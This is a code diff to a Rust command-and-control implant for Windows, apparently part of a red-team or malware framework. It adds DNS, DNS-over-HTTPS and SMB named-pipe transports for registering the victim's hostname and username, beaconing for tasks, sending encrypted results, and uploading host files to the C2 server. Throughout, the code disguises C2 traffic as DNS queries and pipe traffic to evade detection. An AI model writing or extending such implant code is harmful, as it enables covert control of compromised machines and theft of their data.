@@ -20,6 +20,7 @@ use windows_sys::Win32::Networking::WinHttp::{
 };
 
 use crate::{config, crypto};
+use crate::{transport_dns, transport_doh, transport_smb};
 
 // Self-signed cert ignore flags (standard WinHTTP constants)
 const SEC_IGNORE_UNKNOWN_CA: u32        = 0x0100;
@@ -79,7 +80,7 @@ impl WHandle {
 
 // ── Wide string helper ────────────────────────────────────────────────────────
 
-fn wstr(s: &str) -> Vec<u16> {
+pub(crate) fn wstr(s: &str) -> Vec<u16> {
     s.encode_utf16().chain(core::iter::once(0u16)).collect()
 }
 
@@ -177,7 +178,7 @@ fn load_mtls_cert() -> *mut c_void {
 
 /// Internal HTTP worker.  Pass `cert_ctx = null_mut()` for plain HTTP/HTTPS;
 /// pass a valid CERT_CONTEXT pointer for mTLS.
-fn http_do_inner(method: &str, path: &str, body: &[u8], cert_ctx: *mut c_void) -> Option<(u32, Vec<u8>)> {
+pub(crate) fn http_do_inner(method: &str, path: &str, body: &[u8], cert_ctx: *mut c_void) -> Option<(u32, Vec<u8>)> {
     let p = parse_url(config::SERVER_URL);
     let full_path = format!("{}{}", p.base, path);
 
@@ -339,18 +340,27 @@ pub struct AgentTransport {
     /// CERT_CONTEXT pointer for mTLS; null_mut() otherwise.
     /// Raw pointer: AgentTransport is only ever used on the main thread.
     cert_ctx:     *mut c_void,
+    /// Named pipe HANDLE for SMB transport; INVALID_HANDLE_VALUE otherwise.
+    smb_pipe:     isize,
+    /// DNS resolver "host:port" for DNS/DoH transports.
+    dns_server:   String,
+    /// Authoritative C2 domain for DNS transport.
+    dns_domain:   String,
 }
 
 impl Default for AgentTransport {
     fn default() -> Self {
         AgentTransport {
-            agent_id: String::new(),
-            aes_key:  Vec::new(),
-            uri_idx:  0,
-            uri_list: Vec::new(),
-            tcp_addr: String::new(),
-            tcp_conn: None,
-            cert_ctx: ptr::null_mut(),
+            agent_id:   String::new(),
+            aes_key:    Vec::new(),
+            uri_idx:    0,
+            uri_list:   Vec::new(),
+            tcp_addr:   String::new(),
+            tcp_conn:   None,
+            cert_ctx:   ptr::null_mut(),
+            smb_pipe:   -1isize, // INVALID_HANDLE_VALUE
+            dns_server: String::new(),
+            dns_domain: String::new(),
         }
     }
 }
@@ -370,7 +380,6 @@ impl AgentTransport {
         }
         match config::TRANSPORT {
             "tcp" => {
-                // Strip "tcp://" prefix; store bare "host:port"
                 let addr = config::SERVER_URL
                     .strip_prefix("tcp://")
                     .unwrap_or(config::SERVER_URL);
@@ -378,6 +387,22 @@ impl AgentTransport {
             }
             "mtls" => {
                 t.cert_ctx = load_mtls_cert();
+            }
+            "dns" => {
+                let srv = config::DNS_SERVER;
+                t.dns_server = if srv.contains(':') {
+                    srv.to_string()
+                } else {
+                    format!("{}:53", srv)
+                };
+                t.dns_domain = config::DNS_DOMAIN.to_ascii_lowercase()
+                    .trim_matches('.').to_string();
+            }
+            "doh" => {
+                // DoH uses HTTP for registration; no extra state needed
+            }
+            "smb" => {
+                // SMB pipe opened during registration
             }
             _ => {}
         }
@@ -456,6 +481,25 @@ impl AgentTransport {
     // ── Registration ──────────────────────────────────────────────────────────
 
     fn try_register(&mut self) -> Option<()> {
+        match config::TRANSPORT {
+            "dns" => {
+                let id = transport_dns::register(&self.dns_server, &self.dns_domain)?;
+                self.agent_id = id;
+                // DNS doesn't use AES; leave aes_key empty
+                return Some(());
+            }
+            "smb" => {
+                let h = transport_smb::open_pipe(config::SMB_PIPE);
+                if h == -1isize { return None; }
+                let (id, key) = transport_smb::register(h)?;
+                self.agent_id = id;
+                self.aes_key  = key;
+                self.smb_pipe = h;
+                return Some(());
+            }
+            _ => {}
+        }
+
         let body = serde_json::json!({
             "hostname":     std::env::var("COMPUTERNAME").unwrap_or_else(|_| "UNKNOWN".into()),
             "username":     std::env::var("USERNAME").unwrap_or_else(|_| "UNKNOWN".into()),
@@ -482,7 +526,7 @@ impl AgentTransport {
             return Some(());
         }
 
-        // HTTP / HTTPS / mTLS
+        // HTTP / HTTPS / mTLS / DoH (DoH delegates registration to HTTP)
         let (code, resp) = http_do_inner("POST", "/register", body.to_string().as_bytes(), self.cert_ctx)?;
         if code != 200 || resp.is_empty() { return None; }
         let j: Value = serde_json::from_slice(&resp).ok()?;
@@ -494,25 +538,62 @@ impl AgentTransport {
     // ── Beacon ────────────────────────────────────────────────────────────────
 
     pub fn beacon(&mut self) -> Vec<TaskWire> {
-        if config::TRANSPORT == "tcp" {
-            if !self.tcp_ensure_connected() { return vec![]; }
-            if !self.tcp_send_msg("beacon", &Value::Null) {
-                self.tcp_conn = None;
-                return vec![];
+        match config::TRANSPORT {
+            "dns" => {
+                let plain = match transport_dns::beacon(&self.dns_server, &self.dns_domain, &self.agent_id) {
+                    Some(p) => p,
+                    None    => return vec![],
+                };
+                // DNS returns a single-task JSON object, wrap as {"tasks":[...]}
+                let j: Value = match serde_json::from_slice(&plain) { Ok(v) => v, Err(_) => return vec![] };
+                let id   = j["id"].as_i64().unwrap_or(0);
+                let typ  = j["type"].as_str().unwrap_or("").to_string();
+                let args = j.get("args").and_then(|v| v.as_str()).unwrap_or("").to_string();
+                return vec![TaskWire { id, typ, args, payload: vec![] }];
             }
-            let (typ, p) = match self.tcp_recv_msg() {
-                Some(m) => m,
-                None    => { self.tcp_conn = None; return vec![]; }
-            };
-            if typ == "no_tasks" { return vec![]; }
-            if typ != "tasks"    { return vec![]; }
-            let b64 = match p.as_str() { Some(s) => s, None => return vec![] };
-            let enc = match STANDARD.decode(b64) { Ok(e) => e, Err(_) => return vec![] };
-            let plain = match crypto::open(&self.aes_key, &enc) {
-                Some(p) => p,
-                None    => return vec![],
-            };
-            return parse_tasks(&plain);
+            "doh" => {
+                // GET /dns-query?name=b.<dohEncode(agentID)>&type=TXT
+                let name    = format!("b.{}", transport_doh::doh_encode(self.agent_id.as_bytes()));
+                let path    = format!("/dns-query?name={}&type=TXT", transport_doh::url_encode(&name));
+                let accept  = "Accept: application/dns-message\r\n";
+                let (code, resp) = http_do_with_header("GET", &path, &[], accept).unwrap_or((0, vec![]));
+                if code == 204 || resp.is_empty() || code != 200 { return vec![]; }
+                let raw_txt = transport_doh::parse_doh_txt(&resp);
+                let plain   = match transport_doh::decrypt_beacon(&raw_txt, &self.aes_key) {
+                    Some(p) => p,
+                    None    => return vec![],
+                };
+                return parse_tasks(&plain);
+            }
+            "smb" => {
+                if self.smb_pipe == -1isize { return vec![]; }
+                let resp = match transport_smb::beacon(self.smb_pipe, &self.agent_id) {
+                    Some(r) => r,
+                    None    => return vec![],
+                };
+                return transport_smb::parse_smb_tasks(&resp);
+            }
+            "tcp" => {
+                if !self.tcp_ensure_connected() { return vec![]; }
+                if !self.tcp_send_msg("beacon", &Value::Null) {
+                    self.tcp_conn = None;
+                    return vec![];
+                }
+                let (typ, p) = match self.tcp_recv_msg() {
+                    Some(m) => m,
+                    None    => { self.tcp_conn = None; return vec![]; }
+                };
+                if typ == "no_tasks" { return vec![]; }
+                if typ != "tasks"    { return vec![]; }
+                let b64 = match p.as_str() { Some(s) => s, None => return vec![] };
+                let enc = match STANDARD.decode(b64) { Ok(e) => e, Err(_) => return vec![] };
+                let plain = match crypto::open(&self.aes_key, &enc) {
+                    Some(p) => p,
+                    None    => return vec![],
+                };
+                return parse_tasks(&plain);
+            }
+            _ => {}
         }
 
         // HTTP / HTTPS / mTLS
@@ -539,6 +620,47 @@ impl AgentTransport {
     }
 
     pub fn send_result_admin(&mut self, task_id: i64, output: &str, error: &str, is_admin: bool) {
+        match config::TRANSPORT {
+            "dns" => {
+                transport_dns::send_result(&self.dns_server, &self.dns_domain,
+                    &self.agent_id, task_id, output, error);
+                return;
+            }
+            "doh" => {
+                let ct = transport_doh::make_result_ciphertext(&self.aes_key, task_id, output, error);
+                if transport_doh::is_small_result(&ct) {
+                    let name = transport_doh::make_result_query_name(&self.agent_id, &ct);
+                    let path = format!("/dns-query?name={}&type=TXT",
+                        transport_doh::url_encode(&name));
+                    let _ = http_do_with_header("GET", &path, &[], "Accept: application/dns-message\r\n");
+                } else {
+                    let path = format!("/result/{}", self.agent_id);
+                    let _ = http_do_inner("POST", &path, &ct, self.cert_ctx);
+                }
+                return;
+            }
+            "smb" => {
+                if self.smb_pipe != -1isize {
+                    transport_smb::send_result(self.smb_pipe, &self.agent_id,
+                        task_id, output, error, is_admin);
+                }
+                return;
+            }
+            "tcp" => {
+                if self.aes_key.is_empty() { return; }
+                let plain = serde_json::json!({
+                    "task_id":  task_id, "output": output,
+                    "error":    error,   "is_admin": is_admin,
+                }).to_string();
+                let enc     = crypto::seal(&self.aes_key, plain.as_bytes());
+                let payload = Value::String(STANDARD.encode(&enc));
+                if !self.tcp_send_msg("result", &payload) { self.tcp_conn = None; }
+                return;
+            }
+            _ => {}
+        }
+
+        // HTTP / HTTPS / mTLS
         if self.aes_key.is_empty() { return; }
         let plain = serde_json::json!({
             "task_id":  task_id,
@@ -546,46 +668,45 @@ impl AgentTransport {
             "error":    error,
             "is_admin": is_admin,
         }).to_string();
-        let enc = crypto::seal(&self.aes_key, plain.as_bytes());
-
-        if config::TRANSPORT == "tcp" {
-            let payload = Value::String(STANDARD.encode(&enc));
-            if !self.tcp_send_msg("result", &payload) {
-                self.tcp_conn = None;
-            }
-            return;
-        }
-
+        let enc  = crypto::seal(&self.aes_key, plain.as_bytes());
         let path = format!("/result/{}", self.agent_id);
         let _ = http_do_inner("POST", &path, &enc, self.cert_ctx);
     }
 
     pub fn upload_file(&mut self, task_id: i64, filename: &str, data: &[u8]) {
-        if self.aes_key.is_empty() { return; }
-
-        if config::TRANSPORT == "tcp" {
-            let inner = serde_json::json!({
-                "task_id":  task_id,
-                "filename": filename,
-                "data":     STANDARD.encode(data),
-            }).to_string();
-            let enc = crypto::seal(&self.aes_key, inner.as_bytes());
-            let payload = Value::String(STANDARD.encode(&enc));
-            if !self.tcp_send_msg("upload", &payload) {
-                self.tcp_conn = None;
+        match config::TRANSPORT {
+            "dns" | "smb" => {
+                // Not supported — send a note as the result
+                self.send_result(task_id,
+                    &format!("file:{}:size={}", filename, data.len()),
+                    "upload-not-supported-over-dns-smb");
+                return;
             }
-            return;
+            "tcp" => {
+                if self.aes_key.is_empty() { return; }
+                let inner = serde_json::json!({
+                    "task_id":  task_id,
+                    "filename": filename,
+                    "data":     STANDARD.encode(data),
+                }).to_string();
+                let enc     = crypto::seal(&self.aes_key, inner.as_bytes());
+                let payload = Value::String(STANDARD.encode(&enc));
+                if !self.tcp_send_msg("upload", &payload) { self.tcp_conn = None; }
+                return;
+            }
+            _ => {}
         }
-
-        // HTTP / HTTPS / mTLS — encrypt just the raw file bytes
+        if self.aes_key.is_empty() { return; }
         let enc  = crypto::seal(&self.aes_key, data);
         let path = format!("/upload/{}/{}", self.agent_id, filename);
         let _ = http_do_inner("POST", &path, &enc, self.cert_ctx);
     }
 
     pub fn download_file(&mut self, filename: &str) -> Vec<u8> {
-        // TCP has no download primitive
-        if config::TRANSPORT == "tcp" { return vec![]; }
+        match config::TRANSPORT {
+            "dns" | "smb" | "tcp" => return vec![],
+            _ => {}
+        }
         if self.aes_key.is_empty() { return vec![]; }
         let path = format!("/dl/{}/{}", self.agent_id, filename);
         let (code, resp) = http_do_inner("GET", &path, &[], self.cert_ctx).unwrap_or((0, vec![]));
